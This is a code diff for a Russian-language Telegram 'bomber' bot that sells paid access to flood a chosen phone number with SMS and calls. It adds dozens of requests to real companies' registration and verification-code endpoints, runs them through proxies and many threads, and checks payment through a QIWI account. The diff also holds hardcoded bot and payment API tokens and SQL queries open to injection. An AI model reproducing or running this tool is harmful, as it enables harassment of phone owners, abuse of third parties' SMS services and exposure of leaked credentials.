@@ -9,52 +9,29 @@ from random import choice
 
 import random, time
 import threading
+import json
+import sqlite3
 import os
-
-init()
-proxies = {}
-fout = open('http_proxies.txt', 'rt')
-lines = fout.readlines()
-fout.close()
-
-proxies = []
-for line in lines:
-    proxies.append(line)
-proxies = random.choice(proxies).rstrip()
-proxies = 'HTTP', proxies
-
-print(proxies)
-TheVar = 1
-
-out_time = 0.5
-
-
-class MyThread(threading.Thread):
-    def run(self):
-        global theVar
-
-
-def listener(messages):
-    @bot.message_handler(commands=['script1'])
-    def handle_script1_request(message, theVar=None, ssh=None):
-        ip = message.text.split()[-1]
-        result = ssh.get_script1(ip)
-        bot.send_message(message.chat.id, result)
-        theVar = theVar + 1
-
-
-for x in range(200):
-    MyThread().start()
-
-TOKEN = os.environ.get('BOT_TOKEN')
-TOKEN = '1040360800:AAHrux5TfRnok9foJDP2gM7QGRvz7esmkHE'
+QIWI_TOKEN = '515f7148f79370f751a7f78217ab3c2c'
+QIWI_ACCOUNT = '380636071645'
+premium = 'premium.txt'
 let = 1
-THREADS_LIMIT = 100
+s = requests.Session()
+s.headers['authorization'] = 'Bearer ' + QIWI_TOKEN
+parameters = {'rows': '50'}
+h = s.get('https://edge.qiwi.com/payment-history/v1/persons/' + QIWI_ACCOUNT + '/payments', params=parameters)
+req = json.loads(h.text)
+
+TOKEN = '1055275001:AAGuT0Mf9uzuSqQHM5ssIRjTTiURYa5Nn5c'
+conn = sqlite3.connect('test.db', check_same_thread=False)
+c = conn.cursor()
+c.execute("CREATE TABLE IF NOT EXISTS payment_query(user_id INTEGER, sum INTEGER, code INTEGER)")
+THREADS_LIMIT = 400
 
 chat_ids_file = 'chat_ids.txt'
 
 ADMIN_CHAT_ID = 947353888
-
+premium = 'premium.txt'
 users_amount = [0]
 threads = list()
 THREADS_AMOUNT = [0]
@@ -98,35 +75,38 @@ def send_message_users(message):
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    chat_id = str(message.from_user.id)
+    with open(premium, "a+") as ids_file:
+        ids_file.seek(0)
 
-    faq = types.KeyboardButton(text='Соглашение')
-    premium = types.KeyboardButton(text='Премиум')
-    boom = types.KeyboardButton(text='Бомбер')
-    stop = types.KeyboardButton(text='Отключить')
-    buttons_to_add = [faq, premium, boom, stop]
-    keyboard.add(*buttons_to_add)
+        ids_list = [line.split('\n')[0] for line in ids_file]
 
-    # with open("premium.txt") as file:
-    #     arrayBL = [row.strip() for row in file]
-    #     iduser = f'{message.chat.id}'
-    # if iduser in arrayBL:
-    #     boom = types.KeyboardButton(text='Бомбер')
-    #     stop = types.KeyboardButton(text='Отключить')
-    #     keyboard.add(*buttons_to_add)
-    # else:
-    #     pass
+        if chat_id in ids_list:
+            keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+            boom = types.KeyboardButton(text='БОМБЕР')
+            stop = types.KeyboardButton(text='Остановить спам')
+            info = types.KeyboardButton(text='Информация')
 
-    if int(message.chat.id) == ADMIN_CHAT_ID:
-        buttons_to_add.append(types.KeyboardButton(text='Рассылка'))
-        boom = types.KeyboardButton(text='Бомбер')
-        stop = types.KeyboardButton(text='Отключить')
-        keyboard.add(*buttons_to_add)
-    bot.send_message(message.chat.id,
-                     f'❤ Премиум доступ  - 50Р\n - 120 Сервисов \n Бесконечный флуд \n Доступ НАВСЕГДА \n Запускайте флуд сразу на 10 НОМЕРОВ\n 🙎За покупкой - @viannedi \n Или \n\n Перейдите по ссылке для оплаты \n❗️Обязательно введите коментарий: <code>{message.chat.id}</code>',
-                     parse_mode='html', reply_markup=keyboard)
+            buttons_to_add = [boom, stop, info]
+            keyboard.add(*buttons_to_add)
+            bot.send_message(message.chat.id,
+                             'Вы премиум! \n Выбирите действия:',
+                             reply_markup=keyboard)
+        else:
+            sum = 60
 
-    save_chat_id(message.chat.id)
+            c.execute(f"INSERT INTO payment_query VALUES({message.from_user.id}, {sum})")
+            conn.commit()
+
+            markup = types.InlineKeyboardMarkup(row_width=2)
+            item = types.InlineKeyboardButton("Купить бомбер", url='t.me/viannedi')
+
+            markup.add(item)
+
+            bot.send_message(chat_id, f'''❤ Премиум доступ  - 60Р\n Как приобрести?\n Написать создателю бомбера - <a href="t.me/viannedi">Viannedi</a>\n Или: \n Пейредите по ссылке: <a href="t.me/viannedi">QIWI</a> и переведите <code>60</code> рублей. С коментарием <code>{message.from_user.id}</code\n\nЧтобы проверить оплату - /check''',
+                     parse_mode='html', reply_markup=markup)
+    return
+
 
 
 # @bot.message_handler(commands=['bomber'])
@@ -162,6 +142,7 @@ def send_for_number(phone):
     _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
                                                                                                            9:11]  # '+7 (915) 350 99 08'
     _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'
+
     try:
         requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                       data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
@@ -169,6 +150,184 @@ def send_for_number(phone):
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'},
                       proxies={"http": "104.20.7.231:8080"})
         print('[+] Grab отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': _phone})
+        print('[+] Prime отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
+        print('[+] Yandex.Chef')
+        time.sleep(0.1)
+    except:
+        print('[-] не отправлено!')
+
+    try:
+        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _name})
+        print('[+] EasyPAY отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
+        print('[+] finam отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.get('https://findclone.ru/register', params={"phone": "+" + _phone})
+        print('[+] FindClone отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://fix-price.ru/ajax/register_phone_code.php',
+                      data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
+        print('[+] Fix-Price отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://guru.taxi/api/v1/driver/session/verify', json={"phone": {"code": 1, "number": _phone}})
+        print('[+] GURU отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
+        print('[+] SportMaster!')
+        time.sleep(0.1)
+    except:
+        print('[-] не отправлено!')
+
+    try:
+        requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword',
+                      data={"password": _name, "application": "lkp", "login": "+" + _phone})
+        print('[+] Invitro отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
+        print('[+] Iqos отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://app.karusel.ru/api/v1/phone/', data={"phone": _phone})
+        print('[+] Karusel отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={"phone": "+" + _phone})
+        print('[+] Lenta отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html',
+                      data={"phone": _phone, "do": "phone"})
+        print('[+] Menu отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
+                      data={"user_info[fullname]": _name, "user_info[phone]": _phone, "user_info[email]": email,
+                            "user_info[password]": _name, "user_info[conf_password]": _name, })
+        print('[+] Menu2 отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://mobileplanet.ua/register',
+                      data={"klient_name": _name, "klient_phone": "+" + _phone, "klient_email": email})
+        print('[+] mobileplanet отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://www.moyo.ua/identity/registration',
+                      data={"firstname": _name, "phone": _phone, "email": email})
+        print('[+] MOYO отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
+        print('[+] MultiPlex отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
+                      data={"st.r.phone": "+" + _phone})
+        print('[+] OK отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://www.ollis.ru/gql', json={
+            "query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }' % _phone})
+        print('[+] Oliis отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
+        print('[+] Online.ua отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://plink.tech/resend_activation_token/?via=call', json={"phone": _phone})
+        print('[+] Plink отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://app.redmondeda.ru/api/v1/app/sendverificationcode', headers={"token": "."},
+                      data={"phone": _phone})
+        print('[+] REDmondeta отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://pay.visa.ru/api/Auth/code/request', json={"phoneNumber": "+" + _phone})
+        print('[+] Visa отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] error in sent!')
+
+    try:
+        requests.post('https://api.iconjob.co/api/auth/verification_code', json={"phone": _phone})
+        print('[+] iconjob отправлено!')
         time.sleep(0.1)
     except:
         print('[-] error in sent!')
@@ -206,7 +365,7 @@ def send_for_number(phone):
 
     try:
         requests.post('https://sushiwok.ua/user/phone/validate',
-                      data={"phone": "+" + _phone, "captchaRegisterAnswer": false, "repeatCaptcha": false},
+                      data={"phone": "+" + _phone, "captchaRegisterAnswer": False, "repeatCaptcha": False},
                       proxies={"http": "104.20.7.231:8080"})
         print('[+] Sushiwok отправлено!')
         time.sleep(0.1)
@@ -457,7 +616,7 @@ def send_for_number(phone):
         print('[-] VSK не отправлено!')
 
     try:
-        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": 'fger#$tewg'},
+        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": 'l4034#)3455'},
                       proxies={"http": "104.20.7.231:8080"})
         print('[+] EasyPay отправлено!')
         time.sleep(0.1)
@@ -533,7 +692,6 @@ def send_for_number(phone):
         time.sleep(0.1)
     except:
         print('[-] не отправлено!')
-
 
     try:
         requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone},
@@ -997,7 +1155,6 @@ def send_for_number(phone):
     except:
         print('[-] error in sent!')
 
-
 def start_spam(chat_id, phone_number, force):
     global msg
     running_spams_per_chat_id.append(chat_id)
@@ -1024,16 +1181,16 @@ def start_spam(chat_id, phone_number, force):
         pass
 
 
+
 def spam_handler(phone, chat_id, force):
     if int(chat_id) in running_spams_per_chat_id:
-        bot.send_message(chat_id,
-                         'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Остановить спам и поробуйте снова')
+        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Остановить спам и попробуйте снова')
         return
 
     if THREADS_AMOUNT[0] < THREADS_LIMIT:
-        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
+        x = Thread(target=start_spam, args=(chat_id, phone, force))
         threads.append(x)
-        THREADS_AMOUNT[0] += 1
+        THREADS_AMOUNT[0] += 10
         x.start()
     else:
         bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
@@ -1068,7 +1225,39 @@ def handle_message_received(message):
             bot.send_message(chat_id, 'Вы еще не начинали спам')
         else:
             running_spams_per_chat_id.remove(chat_id)
-            bot.send_message(chat_id, 'Спам на номер завершен!')
+    elif text == '/check':
+        result = c.execute(
+            f"SELECT * FROM payment_query WHERE user_id = {message.from_user.id}").fetchone()  # достаем данные из таблицы
+
+        # не рекомендую так делать, но это просто для теста (простите)
+        sum = result[1]
+        random_code = result[2]
+        print(sum)
+        print(random_code)
+
+
+        d = 0
+        for i in range(len(req['data'])):
+                if req['data'][i]['comment'] == message.from_user.id:
+                    if req['data'][i]['sum']['amount'] == sum:
+                        chat_id = str(message.from_user.id)
+                        with open(premium, "a+") as ids_file:
+                            ids_file.seek(0)
+
+                            ids_list = [line.split('\n')[0] for line in ids_file]
+
+                            if chat_id not in ids_list:
+                                ids_file.write(f'{chat_id}\n')
+                                ids_list.append(chat_id)
+                                print(f'New chat_id saved: {chat_id}')
+                                c.execute(
+                                    f"DELETE FROM payment_query WHERE user_id = {message.from_user.id}")  # удаляем временные данные из таблицы
+                                bot.send_message(chat_id, 'Отлично вам выдан премиум!')
+                if d == len(req['data']):
+                    bot.send_message(chat_id, 'Я не нашёл оплаты от вас')
+
+                    # код, который сработает, если оплата прошла успешно
+
     elif text == 'Премиум':
         markup = types.InlineKeyboardMarkup(row_width=2)
         item1 = types.InlineKeyboardButton("Купить премиум", callback_data='good', url='https://qiwi.me/viannedi')
@@ -1082,7 +1271,6 @@ def handle_message_received(message):
     elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
         msg = text.replace("РАЗОСЛАТЬ: ", "")
         send_message_users(msg)
-
     elif let == 1:
         text = message.text
         check = text.isdigit()
